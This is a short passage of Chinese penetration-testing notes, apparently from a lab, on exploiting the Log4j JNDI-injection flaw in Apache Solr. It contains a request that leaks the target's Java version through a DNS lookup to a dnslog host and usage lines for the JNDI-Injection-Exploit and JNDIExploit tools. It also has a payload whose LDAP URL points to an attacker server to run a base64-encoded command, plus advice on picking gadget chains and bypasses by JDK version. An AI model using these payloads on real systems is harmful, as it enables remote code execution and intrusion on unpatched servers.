使用dnslog探测Java版本
```
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.a57751c3.log.dnslog.pp.ua.} HTTP/1.1
Host: 192.168.68.46:8983
```
![[Log4j-20260911.png]]
针对JDK 8u102版本可使用JNDI-Injection-Exploit，JDK 1.7和1.8两个链都能使用
`java -jar JNDI-Injection-Exploit.jar -C "cmd" -A ip`
![[Log4j-20260910-2.png]]
*注意编译工具的Java版本最好为JDK 8，避免高版本rmi无法使用`com.sun.jndi.rmi.registry.ReferenceWrapper`导致`IllegalAccessError`异常

或者可使用JNDIExploit的Basic，具备相关绕过条件（高JDK版本和容器classpath存在）时可使用TomcatBypass或GroovyBypass
![[Log4j-20260910-1.png]]
`java -jar JNDIExploit-2.0-SNAPSHOT.jar -i`
![[Log4j-20260910.png]]
访问```
```
GET /solr/admin/cores?action=${jndi:ldap://192.168.139.3:1389/Basic/Command/dG91Y2ggL3RtcC9zdWNlc3M=} 
```
